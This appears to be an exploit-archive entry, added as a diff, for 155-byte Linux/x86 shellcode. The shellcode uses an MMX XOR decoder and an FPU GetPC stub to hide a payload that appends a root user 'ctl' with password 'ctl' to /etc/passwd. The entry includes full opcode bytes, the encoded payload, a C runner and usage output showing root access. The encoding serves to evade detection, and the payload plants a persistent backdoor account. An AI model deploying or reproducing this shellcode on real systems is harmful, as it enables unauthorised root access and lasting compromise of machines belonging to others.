@@ -1,0 +1,62 @@
+id: 34327
+date: 04/27/2020
+title: Linux/x86 Dynamic MMX+FPU Encoded Add Root User Shellcode (155 bytes)
+author: Bobby Cooke
+cves: 
+
+// Shellcode Title:  Linux/x86 - Dynamic MMX+FPU Encoded Add Root User Shellcode (155 bytes)
+// Shellcode Author: Bobby Cooke
+// Description:      This shellcode has a MMX stub decoder that dynamically decodes the payload in memory. The FPU GetPC technique is used to determine the offset from EIP dynamically in running memory. Once decoded. this shellcode adds the user 'ctl' with the password 'ctl' to the /etc/passwd file; with the UID & GID of 0 (root). This shellcode uses legacy passwd functionality. Therefor the /etc/shadow file does not need to be accessed or modified.
+// Usage:
+//   root# gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
+//   root# cat /etc/passwd | grep 0:0
+//     root:x:0:0:root:/root:/bin/bash
+//   root# ./shellcode 
+//     Shellcode Length:  155
+//   root# cat /etc/passwd | grep 0:0
+//     root:x:0:0:root:/root:/bin/bash
+//     ctl:NNwZ8D1QjVy3Y:0:0::/:/bin//sh
+//   root# exit
+//   user$ su ctl
+//     Password: ctl
+//   # id
+//     uid=0(root) gid=0(root) groups=0(root)
+
+#include<stdio.h>
+#include<string.h>
+unsigned char code[] = \
+"\xd9\xee"             // fldz                 ; x87 FPU - Get EIP Technique
+"\x9b\xd9\x74\x24\xf4" // fstenv [esp -0xc]    ; push EIP at fldz instr to stack
+"\x5f"                 // pop edi              ; pop EIP fldz location to EDI 
+"\x83\xc7\x28"         //add edi, 0x28         ; set EDI to memory location of mmx_XOR
+"\x0f\x6f\x1f"         // movq mm3, qword [edi]; use instructions located here as the XOR decoder
+"\x8d\x77\x08"         // lea esi, [edi +8]    ; set ESI to payload location
+"\x31\xc9"             // xor ecx, ecx         ; clear ECX
+"\x41"                 // inc ecx              ; inc ECX to 1
+// decode:
+"\x0f\x6f\x2e"         // movq mm5, qword [esi]  ; move 8 bytes of encoded payload to MM3
+"\x0f\xef\xeb"         // pxor mm5, mm3          ; XOR MM5 with MM3
+"\x0f\x7f\x2e"         // movq qword [esi], mm5  ; overwrite 8 bytes of encoded payload with decoded
+"\x83\xc6\x08"         // add esi, 0x8           ; move ESI to the next 8 encoded bytes
+"\x83\xf9\x0e"         // cmp ecx, 0xe           ; is payload decoded?
+"\x74\x0b"             // je payload             ; if decoded, execute payload
+"\x41"                 // inc ecx                ; if not, decode next 8 byte
+"\xeb\xec"             // jmp short decode       ; jump to start of decode loop
+"\xcc\xee\xd9\xee\xcc\xd9\xd9\xcc" // MMX Decoder Key
+// encodedPayload:
+// Add Root User to /etc/passwd - user:ctl & pass:ctl
+"\x27\xc9\x87\xdf\x0c\x89\x54\xd8\xe8\x11\xaf\xc4\x33\xaf\xff\x41"
+"\xc0\xca\x51\xa8\xce\x51\x9f\xf1\x9c\x63\x87\xed\x9f\x54\xc7\x9f"
+"\x45\x25\x8a\x67\x2d\x69\xd2\x01\x4c\x06\x0d\x11\x33\x26\xf4\xaf"
+"\xef\xc1\xbb\x87\xa2\xf6\xbc\xaf\xa4\x81\xf9\x8d\xb8\xb5\xe3\x82"
+"\x82\x99\x83\xd6\x88\xe8\x88\xa6\x9a\x97\xea\xb7\xf6\xe9\xe3\xfc"
+"\xf6\xd4\xf6\xd4\xe3\xbb\xb0\xa2\xe3\xc1\xaa\x86\xec\xe7\xe7\xec"
+"\xe3\x8b\xad\x8d\xe3\xa9\xb8\xbf\xbf\x99\xbd";
+int main()
+{
+  printf("Shellcode Length:  %d\n", strlen(code));
+  int (*ret)() = (int(*)())code;
+  ret();
+}
+
+#  0day.today [2023-03-24]  #
